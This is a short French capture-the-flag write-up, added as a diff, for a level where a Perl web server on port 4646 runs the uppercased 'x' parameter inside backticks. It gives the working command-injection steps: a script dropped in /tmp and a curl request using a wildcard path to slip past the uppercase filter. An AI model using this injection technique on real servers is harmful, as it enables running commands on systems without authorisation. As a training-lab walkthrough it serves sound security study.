@@ -1,0 +1,20 @@
+Le dossier home contient un fichier, level12.pl, c'est un fichier perl.
+On remarque que c'est un serveur, qui écoute le port 4646
+Comme la dernière fois on peut lui passer un argument avec x en paramètre url
+
+On voit que le paramètre x est d'abord mis en majuscule,
+puis tout ce qui est après le premier espace est enlevé,
+en utilisant des regex
+Ensuite cette variable est mise entre backticks (qui permet d'éxécuter une commande shell),
+sans escaping, ce qui s'ignifie qu'on peut faire éxécuter une commande shell par le serveur
+
+vu qu'on ne peut pas éxécuter de commande sans qu'elle soit tout en majuscules, on va mettre
+getflag dans un fichier:
+echo "getflag > /tmp/flag && chmod 777 /tmp/flag" > /tmp/HACK
+chmod 777 /tmp/HACK
+
+Puis on prends un chemin un peu détourné pour l'appeler depuis le serveur, sans utiliser de minuscules
+curl 127.0.0.1:4646?x=\`/*/HACK\`
+
+Le retour du script est dans /tmp/flag
+cat /tmp/flag
